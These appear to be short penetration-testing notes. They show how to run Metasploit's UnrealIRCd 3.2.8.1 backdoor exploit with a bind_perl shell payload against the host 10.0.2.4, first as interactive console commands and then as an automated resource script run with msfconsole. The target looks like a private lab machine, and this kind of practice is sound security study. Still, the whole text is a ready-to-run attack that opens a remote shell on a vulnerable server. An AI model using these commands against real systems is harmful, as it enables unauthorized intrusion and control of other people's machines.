### Metasploit ###
#msfconsole #Launches Metasploit Console
#use exploit/unix/irc/unreal_ircd_3281_backdoor # Pick an exploit
#set payload payload/cmd/unix/bind_perl
#set RHOST 10.0.2.4
#exploit 
#exit




### Resource Files in Metasploit ### 
## https://docs.rapid7.com/metasploit/resource-scripts/ ##
echo "use exploit/unix/irc/unreal_ircd_3281_backdoor" > exploit.rc
echo "set payload payload/cmd/unix/bind_perl" >> exploit.rc
echo "set RHOST 10.0.2.4" >> exploit.rc
echo "exploit -z" >> exploit.rc 
echo "exit -y" >> exploit.rc

msfconsole -r exploit.rc